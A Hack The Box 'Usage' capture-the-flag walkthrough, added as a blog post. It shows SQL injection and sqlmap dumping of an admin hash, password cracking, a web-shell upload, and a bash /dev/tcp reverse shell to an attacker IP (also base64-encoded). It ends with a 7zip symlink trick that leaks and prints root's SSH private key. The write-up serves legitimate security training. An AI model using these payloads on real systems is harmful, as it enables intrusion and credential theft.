@@ -1,0 +1,526 @@
+---
+title: Usage Writeup - Hack The Box
+description: Exploiting SQL injection and password cracking for initial access, then analyzing a binary for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-11
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ nmap -sVC 10.129.107.135
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-10 16:58 EEST
+Nmap scan report for 10.129.107.135
+Host is up (0.068s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 a0f8fdd304b807a063dd37dfd7eeca78 (ECDSA)
+|_  256 bd22f5287727fb65baf6fd2f10c7828f (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://usage.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 756.87 seconds
+```
+
+It tried to redirect us to `usage.htb`, so add it to `/etc/hosts`:
+```console
+nontas@local$ echo '10.129.107.135 usage.htb' >> /etc/hosts
+```
+
+The web app shows the following login page: ![login page](/images/blog/usage/20251010170715.png)
+
+We can also register a new account: ![registration page](/images/blog/usage/20251010173435.png)
+
+The "Admin" button tries to redirect us to `admin.usage.htb`, so add that to `/etc/hosts` as well: ![admin redirect](/images/blog/usage/20251010173536.png)
+
+Creating an account and logging in shows the `/dashboard` page: ![dashboard](/images/blog/usage/20251010173900.png)
+
+Nothing too interesting, so let's go back and try to reset our password (from the login page): ![password reset](/images/blog/usage/20251010174211.png)
+
+If we input a random email, we get `Email address does not match in our records!`, while if we use a valid email (like the one we used to register), we get `We have e-mailed your password reset link to test@test.com`.
+
+### SQL Injection
+Since the form checks a database, we can test if it's vuilnerable to SQL injection using a payload like:
+```txt
+test' or 1=1;-- -
+```
+
+![SQL injection test](/images/blog/usage/20251010174739.png)
+
+Since we got a valid response (meaning our "email" was considered valid), that means that it's **vulnerable to SQLi**.
+
+In order to dump the database, we'll use a tool like `SQLMap`.
+
+First, save a valid request into the file `usage.req`:
+```http
+POST /forget-password HTTP/1.1
+Host: usage.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+Origin: http://usage.htb
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://usage.htb/forget-password
+Cookie: XSRF-TOKEN=eyJpdiI6IjROU21xL2xoSHJjQmZVdzE4QnJwVWc9PSIsInZhbHVlIjoiYmRrVVhmeFlQQURVZHo2YS9qQkIzSEttOGJtdXUxZ0VWb05DNkh1WHg2eHRNNlNoa0Zvck1jdUVtR3RLTWptTWZ5RXNhN3Z1Tk0reFFBczNCN2VvWlkrVkVaOWM1eHlhdWdCVytIaHRYaEhueDlOUjNIVjF5RjVoRVQ1eHZZVjkiLCJtYWMiOiIyZGUzYTA5YTllYzA3NTA3MThiZDVkNzhmOWE3OWI1NjY4ODVhN2ZhYTM2YzBhMGFhYTg1OThkOGNmMjIxNTYzIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjdING5CY21xTWdCOFlRM0Y3c0xYVkE9PSIsInZhbHVlIjoiQXB2U0J6UFFsSnVsUWNmQWs1MnN6b29QUWtDOThZYi9xYlZTbkh6cGFDQVQ3ZFdYVEdjeU9DL084eVVaUDlBcVlobEtocUI2M21tZ2lrRkkrWlB3MTVMWHc0Sm9UMjFKOE1WZ283dnl6RWloZjZhYnR2UWtkamVhTHorN0Yxa00iLCJtYWMiOiIwYmZhZTFkMDI5MGE3NWQ5NDI4MTM5YTVhMjIyODA5YTZkYTU2OTFjZGYxYjc5ZjM0OWY1MTYzMjczNTAwNzU1IiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+_token=rqScdeH4JQ0Ol6702c6jN4HdNG6J2fgFONQMSpt4&email=test%40test.com
+```
+
+And pass it to `sqlmap`:
+```console title="Initial SQLMap attempt"
+nontas@local$ sqlmap -r usage.req --batch
+<SNIP>
+[17:53:22] [WARNING] POST parameter 'email' does not seem to be injectable
+[17:53:22] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[17:53:22] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 40 times
+[17:53:22] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 17:53:22 /2025-10-10/
+```
+
+Seems like we got a bunch of `500` responses and no vulnerability. 
+
+Given that we already know that the `email` parameter is vulnerable, we extend the number of tests with `--level 3`:
+```console title="SQLMap with extended tests"
+nontas@local$ sqlmap -r usage.req --batch --level 3
+<SNIP>
+sqlmap identified the following injection point(s) with a total of 450 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=rqScdeH4JQ0Ol6702c6jN4HdNG6J2fgFONQMSpt4&email=test@test.com' AND 6883=(SELECT (CASE WHEN (6883=6883) THEN 6883 ELSE (SELECT 4992 UNION SELECT 4111) END))-- sTXe
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: _token=rqScdeH4JQ0Ol6702c6jN4HdNG6J2fgFONQMSpt4&email=test@test.com' AND 2897=BENCHMARK(5000000,MD5(0x6551544d))-- Tdvg
+---
+[18:17:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL < 5.0.12
+[18:17:24] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 228 times
+[18:17:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'
+[18:17:24] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:17:24 /2025-10-10/
+```
+
+It found 2 vulnerabilities, so now we can go ahead and enumerate the database.
+
+First, list the available DBs:
+```console title="List databases"
+nontas@local$ sqlmap -r usage.req --batch --level 3 --dbs --threads=10
+<SNIP>
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
+<SNIP>
+```
+
+The non-default DB here is `usage_blog`, so let's list the tables inside:
+```console title="List tables"
+nontas@local$ sqlmap -r usage.req --batch --level 3 -D usage_blog --tables --threads=10
+<SNIP>
+Database: usage_blog
+[15 tables]
++------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+<SNIP>
+```
+
+The table `admin_users` seems interesting, so let's dump it's contents:
+```console title="Dump admin_users table"
+nontas@local$ sqlmap -r usage.req --batch --level 3 -D usage_blog -T admin_users --dump --threads=10
+<SNIP>
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+<SNIP>
+```
+The username is `admin` and the hashed password is `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`.
+
+### Password Cracking
+Crack the hash using `john`:
+```console title="Password cracking"
+nontas@local$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+whatever1        (?)
+1g 0:00:00:19 DONE (2025-10-10 18:36) 0.05045g/s 81.13p/s 81.13c/s 81.13C/s alexis1..green1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+The password for `admin` is `whatever1`.
+
+## Initial Foothold
+Logging into the admin dashboard with the above credentials, we see the following: ![admin dashboard](/images/blog/usage/20251011120725.png)
+
+After searching for exploits, we find that `encore/laravel-admin` is vulnerable to [Arbitrary Code Execution](https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096) with the following [PoC](https://flyd.uk/post/cve-2023-24249/).
+
+Following the guide, we upload a PHP web shell: ![upload shell](/images/blog/usage/20251011125852.png)
+
+and by clicking the "download file" button: ![download file](/images/blog/usage/20251011123606.png)
+
+we're able to run any command with `?cmd=...`: ![command execution](/images/blog/usage/20251011124648.png)
+
+Now, start a `nc` listener:
+```console
+nontas@local$ nc -lnvp 1234
+```
+
+And replay the request but now with a `POST` request instead of `GET`, and change the command to this reverse shell:
+```bash
+bash -i >& /dev/tcp/10.10.14.78/1234 0>&1
+```
+
+<Callout title="Getting the reverse shell to work" type="info">
+To make it work, I had to:
+1.  Base64 encode the payload:
+```bash
+echo -n "bash -i >& /dev/tcp/10.10.14.78/1234 0>&1" | base64
+```
+2. Change the command to this:
+```bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC8xMjM0IDA+JjE= | base64 -d | bash
+```
+3. URL Encode the above command, and send it via the `cmd` paremeter in the `POST` request.
+
+I wasn't able to get the above payload working via a GET request, or directly with the command in step 1.
+</Callout>
+
+The `POST` request looks like this: ![POST request](/images/blog/usage/20251011130824.png)
+
+And we get a revershe shell working (upgrade it to a full TTY):
+```console title="Reverse shell"
+nontas@local$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.107.135.
+Ncat: Connection from 10.129.107.135:43452.
+bash: cannot set terminal process group (1088): Inappropriate ioctl for device
+bash: no job control in this shell
+dash@usage:/var/www/html/project_admin/public/uploads/images$ id
+uid=1000(dash) gid=1000(dash) groups=1000(dash)
+dash@usage:/var/www/html/project_admin/public/uploads/images$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<es$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z
+[1]  + 41398 suspended  nc -lnvp 1234
+[Oct 11, 2025 - 13:09:41 (EEST)] nontas@local$ stty raw -echo;fg                                                          [1]  + 41398 continued  nc -lnvp 1234
+
+dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/user.txt
+```
+
+And we get the user flag.
+
+## Lateral Movement
+Let's list the open TCP ports:
+```console title="List open ports"
+dash@usage:~$ ss -tlnp
+State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
+LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*
+LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*
+LISTEN 0      1024       127.0.0.1:2812       0.0.0.0:*    users:(("monit",pid=19466,fd=5))
+LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1212,fd=6),("nginx",pid=1211,fd=6))
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*
+LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*
+LISTEN 0      128             [::]:22            [::]:*
+```
+
+Ports `3306` and `33060` are for `MySQL`. The interesting port here is `2812`, which belongs to the process `monit`. 
+
+<Callout title="Process snooping disabled" type="info">
+Listing the processes with `ps aux` shows only the ones belonging to our user, so process snooping is disabled. 
+
+We can verify this via `cat /etc/fstab`, which will show the following:
+```txt
+<SNIP>
+proc /proc proc defaults,hidepid=2 0 0
+<SNIP>
+```
+The `hidepid=2` flag hides other user's processes.
+</Callout>
+
+Searching for service files belonging to `monit` doesn't give us a lot of info:
+```console
+dash@usage:~$ find / -name monit.service 2>/dev/null
+/sys/fs/cgroup/system.slice/monit.service
+/usr/share/doc/monit/examples/monit.service
+/etc/systemd/system/monit.service
+/etc/systemd/system/multi-user.target.wants/monit.service
+dash@usage:~$ cat /etc/systemd/system/monit.service
+[Unit]
+Description=Monitoring Service
+After=network.target
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=2
+User=dash
+Group=dash
+ExecStart=/usr/bin/monit
+
+[Install]
+WantedBy=multi-user.target
+```
+
+`Monit` is running as `dash`, which makes it less interesting for exploitation.
+
+Listing the contents in the `home` directory, we see an interesting `.monitrc` file:
+```console
+dash@usage:~$ ls -la
+total 52
+drwxr-x--- 6 dash dash 4096 Oct 11 10:49 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    6 Oct 11 10:49 .monit.pid
+-rw------- 1 dash dash 1192 Oct 11 10:49 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 Oct 10 10:24 user.txt
+dash@usage:~$ cat .monitrc
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+```
+
+It has the credentials `admin:3nc0d3d_pa$$w0rd`.
+
+Let's list the users on the system:
+```console
+dash@usage:~$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+dash:x:1000:1000:dash:/home/dash:/bin/bash
+xander:x:1001:1001::/home/xander:/bin/bash
+```
+
+The above password is the password for the user `xander`:
+```console
+dash@usage:~$ su xander
+Password:
+xander@usage:/home/dash$
+```
+
+We can also use `ssh` to get a more stable shell:
+```console
+nontas@local$ ssh xander@usage.htb
+xander@usage.htb's password:
+<SNIP>
+xander@usage:~$
+```
+
+## Privilege Escalation
+The user `xander` can run the binary file `/usr/bin/usage_management` as `root` without a password:
+```console
+xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+xander@usage:~$ ls -la /usr/bin/usage_management
+-rwxr-xr-x 1 root root 16312 Oct 28  2023 /usr/bin/usage_management
+```
+
+### Dynamic Analysis
+Let's run the executable:
+```console title="Testing the binary"
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+2984 folders, 17945 files, 113878700 bytes (109 MiB)
+
+Creating archive: /var/backups/project.zip
+
+Items to compress: 20929
+
+
+Files read from disk: 17945
+Archive size: 54829548 bytes (53 MiB)
+Everything is Ok
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 2
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+4. Project Backup
+5. Backup MySQL data
+6. Reset admin password
+Enter your choice (1/2/3): 3
+Password has been reset.
+```
+
+We get 3 options in total, but the 1st one seems the most interesting. It seems like it's using `7zip` to create a backup.
+
+Checking the backup directory, we see the following:
+```console
+xander@usage:~$ la -al /var/backups/
+<SNIP>
+-rw-r--r--  1 root root  1344767 Oct 11 15:15 mysql_backup.sql
+-rw-r--r--  1 root root 54829548 Oct 11 15:15 project.zip
+```
+
+`project.zip` was created by option 1, while `mysql_backup.sql` was created by option 2.
+
+### Static Analysis
+Let's check the behavior of the binary by running `strings` on it:
+```console title="Binary analysis"
+xander@usage:~$ strings /usr/bin/usage_management
+<SNIP>
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+<SNIP>
+```
+
+According to this [HackTricks article](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z), `7zip` can be abused to include arbitrary files in archives if we have permission to
+write a symlink into the source destination. In this case, the source is `/var/www/html`.
+
+Let's check our privileges at the directory `/var/www/html`:
+```console
+xander@usage:~$ ls -ld /var/www/html/
+drwxrwxrwx 4 root xander 4096 Apr  3  2024 /var/www/html/
+```
+
+Since we have write permissions, we can exploit it by obtaining the root user's SSH key.
+
+First, create the file `@id_rsa` inside `/var/www/html`:
+```console
+xander@usage:~$ cd /var/www/html
+xander@usage:/var/www/html$ touch @id_rsa
+```
+
+<Callout title="7zip file list parameter" type="info">
+The `@` tells `7zip` to treat `id_rsa` as a list of files.
+</Callout>
+
+Then, create a symlink to the `root` user's SSH key:
+```console
+xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
+xander@usage:/var/www/html$ ls -la id_rsa
+lrwxrwxrwx 1 xander xander 17 Oct 11 15:35 id_rsa -> /root/.ssh/id_rsa
+```
+
+Now, run the binary file with option 1 and you should get the SSH key:
+```console title="Extracting root SSH key"
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+<SNIP>
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+----------------
+Scan WARNINGS: 7
+```
+
+The private key is the following:
+```txt
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Save it to the file `root_key`, modify the permissions and use it:
+```console title="Root access"
+xander@usage:/var/www/html$ nano root_key
+xander@usage:/var/www/html$ chmod 600 root_key
+xander@usage:/var/www/html$ ssh -i root_key root@usage.htb
+<SNIP>
+root@usage:~# cat root.txt
+```
+
+We have successfully completed **Usage**!
